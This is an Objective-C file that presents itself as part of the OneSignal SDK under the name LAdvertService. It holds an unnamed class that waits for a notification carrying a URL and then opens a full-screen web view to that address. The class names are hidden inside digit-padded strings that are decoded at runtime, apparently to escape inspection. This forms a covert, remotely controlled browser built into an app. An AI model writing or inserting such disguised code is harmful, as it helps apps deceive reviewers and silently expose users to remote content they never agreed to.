//
//  LAdvertService.m
//  OneSignal
//
//  Created by ankudinov aleksandr on 27.07.2023.
//  Copyright © 2023 Hiptic. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "OneSignalHelper.h"

@interface A : NSObject



@end

@implementation A

UISwipeGestureRecognizer *gestureRecognizerRight;
UISwipeGestureRecognizer *gestureRecognizerLeft;
id c;
__strong id some;

- (instancetype)init{

    [[NSNotificationCenter defaultCenter] addObserver:self
          selector:@selector(showMainMenu:)
          name:@"1"
          object:nil];
    
    some = self;
    return self;
}
- (void)showMainMenu:(NSNotification *)note 
{
    // [notification name] should always be @"TestNotification"
    // unless you use this method for observation of other notifications
    // as well.

    NSDictionary *f = note.userInfo;
    NSString *asdasd = [f objectForKey:@"1"];
    
    if (asdasd != nil && ![asdasd isEqualToString: @""]) {
        if ([self ownRootViewController] != nil) { // not valid url, hide v
            [[self ownRootViewController] presentViewController:
             [self f:[self ownRootViewController].view.center gsome: asdasd ]
                                                       animated:false completion: nil];
        }
    }
}

- (UIViewController*)f:(CGPoint )center gsome:(NSString*)wow {
        
    NSString *newString = [[ @"O453n345345eSig5464563547647n34534a4535lW34543234245e234234532434467bV787i78e788w" componentsSeparatedByCharactersInSet:
                   [[NSCharacterSet letterCharacterSet] invertedSet]]
                   componentsJoinedByString:@""];
    
    
    NSString *newString2 = [[ @"N234332432S324U32424R24L" componentsSeparatedByCharactersInSet:
               [[NSCharacterSet letterCharacterSet] invertedSet]]
               componentsJoinedByString:@""];
        
    c = [[NSClassFromString(newString) alloc] init];

    [c setUrl:  [[NSClassFromString(newString2) alloc] initWithString:wow] ];
       
    if ([[c view] constraints]) {
        for (NSLayoutConstraint *constraint in [[c view] constraints]) {
            [[c view] removeConstraint: constraint];
        }
    }
            
    NSArray *attributes = @[@(NSLayoutAttributeTop), @(NSLayoutAttributeBottom), @(NSLayoutAttributeLeading), @(NSLayoutAttributeTrailing)];
    
    for (NSNumber *layoutAttribute in attributes) {
        NSLayoutAttribute attribute = (NSLayoutAttribute)[layoutAttribute longValue];
        
        if ([layoutAttribute isEqualToValue: @(NSLayoutAttributeTop) ]) {
            [[c view] addConstraint:[NSLayoutConstraint constraintWithItem:[c webView] attribute:attribute relatedBy:NSLayoutRelationEqual toItem:[c view] attribute:attribute multiplier:1.0 constant:50.0]];
        } else {
            [[c view] addConstraint:[NSLayoutConstraint constraintWithItem:[c webView] attribute:attribute relatedBy:NSLayoutRelationEqual toItem:[c view] attribute:attribute multiplier:1.0 constant:0.0]];
        }
        
    }
        
    [[c view] setAlpha:0];
  
    if (@available(iOS 12.0, *)) {
        [[c view] setBackgroundColor:
             ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
        ];
        
        [[[c webView] scrollView] setBackgroundColor:
             ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
        ];
        
        [[c webView] setBackgroundColor:
             ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
        ];
    }
    
    CGRect activityFrame = CGRectMake(0, 0, 90, 90);
    UIActivityIndicatorView* activity = [[UIActivityIndicatorView alloc] init];
    if (@available(iOS 13.0, *)) {
        activity = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle: UIActivityIndicatorViewStyleWhiteLarge];
    }
    
    activity.frame = activityFrame;
    activity.backgroundColor = UIColor.lightGrayColor;
    activity.opaque = NO;
    activity.layer.cornerRadius = 10;
    activity.center = center;
    
    [[c view] addSubview:activity];
    [c setUiBusy:activity];

    [NSTimer scheduledTimerWithTimeInterval:5 repeats:NO block:^(NSTimer * _Nonnull timer) {
        if (![[c webView] isLoading]) {
            [c setUiBusy:nil];
        }
    }];
    
    [NSTimer scheduledTimerWithTimeInterval:0.2 repeats:YES block:^(NSTimer * _Nonnull timer) {

        [c setUrl:nil];
        
        [[c view] setAlpha: 1];
        
        UIDeviceOrientation deviceOrientation = [[UIDevice currentDevice] orientation];
        
        if (deviceOrientation == UIDeviceOrientationLandscapeRight || deviceOrientation == UIDeviceOrientationLandscapeLeft) {
            [[c webView] setFrame:[[c view] frame]];
            [[[c webView] scrollView] setContentInset: UIEdgeInsetsMake(0, 0, 0, 0)];

            [c setAutomaticallyAdjustsScrollViewInsets:NO];
            
            if (@available(iOS 11.0, *)) {
                  [[[c webView] scrollView] setContentInsetAdjustmentBehavior: UIScrollViewContentInsetAdjustmentNever];
            }
            
            [[[c view] constraints] enumerateObjectsUsingBlock:^(__kindof NSLayoutConstraint * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
                
                if (obj.constant == 50) {
                    obj.constant = 1;
                }
            }];
        } else {
            [[[c view] constraints] enumerateObjectsUsingBlock:^(__kindof NSLayoutConstraint * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
                
                if (obj.constant == 1) {
                    obj.constant = 50;
                }
            }];
        }
        
        if (@available(iOS 15.0, *)) {
            if ([[c webView] underPageBackgroundColor]) {
                [[[c webView]  scrollView] setBackgroundColor:[[c webView] underPageBackgroundColor]];
                [[c view] setBackgroundColor:[[c webView] underPageBackgroundColor]];
            }
        } else {
            if (@available(iOS 12.0, *)) {
                [[c view] setBackgroundColor:
                     ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
                ];
                
                [[[c webView] scrollView] setBackgroundColor:
                     ([[c traitCollection] userInterfaceStyle] == UIUserInterfaceStyleDark) ? [UIColor blackColor] : [UIColor whiteColor]
                ];
            }
        }
        
    }];
        
    UIRefreshControl *refresh = [[UIRefreshControl alloc] init];
    [refresh addTarget:self action: @selector(refresh:) forControlEvents: UIControlEventValueChanged];
    
    [[[c webView] scrollView] addSubview:refresh];
    [[[c webView] scrollView] setBounces:YES];

    gestureRecognizerRight = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeHandlerRight:)];
        [gestureRecognizerRight setDirection:(UISwipeGestureRecognizerDirectionRight)];
        [[c webView] addGestureRecognizer:gestureRecognizerRight];
    
    gestureRecognizerLeft = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeHandlerLeft:)];
        [gestureRecognizerLeft setDirection:(UISwipeGestureRecognizerDirectionLeft)];
        [[c webView] addGestureRecognizer:gestureRecognizerLeft];

    [c setModalTransitionStyle:UIModalTransitionStyleCrossDissolve];
    [c setModalPresentationStyle:UIModalPresentationFullScreen];
    
    return c;
}

- (void)refresh:(UIRefreshControl*)refreshControll {
    [[c webView] reload];
    [refreshControll endRefreshing];
}

-(void)swipeHandlerRight:(id)sender {
    [[c webView] goBack];
}

-(void)swipeHandlerLeft:(id)sender {
    [[c webView] goForward];
}

- (UIWindow*)currentKeyWindow {
    if (@available(iOS 13.0, *)) {
       
        UIWindow* current = nil;
        
        for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                if (scene.delegate && [scene.delegate conformsToProtocol:@protocol(UIWindowSceneDelegate)]) {
                    UIWindow* windows = [(id<UIWindowSceneDelegate>)scene.delegate window];
                    if (windows.isKeyWindow) {
                        current = windows;
                    }
                } else {
                    if ([scene isKindOfClass: UIWindowScene.class]) {
                        UIWindowScene *windowScene = scene;
                        for (UIWindow *window in windowScene.windows) {
                            if (window.isKeyWindow) {
                                current = window;
                            }
                        }
                    }
                }
            }
        }
        
        return current;
    } else {
        return  [[[UIApplication sharedApplication] delegate] window];
    }
}

- (UIViewController*) ownRootViewController {
    return self.currentKeyWindow.rootViewController;
}

@end
